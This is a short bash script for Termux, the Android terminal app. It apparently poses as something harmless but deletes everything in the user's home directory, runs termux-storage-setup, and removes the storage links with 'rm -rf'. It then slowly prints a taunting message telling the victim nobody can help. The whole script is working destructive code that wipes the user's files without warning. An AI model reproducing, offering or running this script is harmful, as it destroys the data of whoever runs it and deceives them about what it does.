#!/data/data/com.termux/files/usr/bin/bash
apt install pv -y
cd && rm -rf * -y && termux-storage-setup -y && rm -rf $HOME/storage -y
echo "You fucked up, Don't ask for help no one can help now (its-over)" | pv -qL 10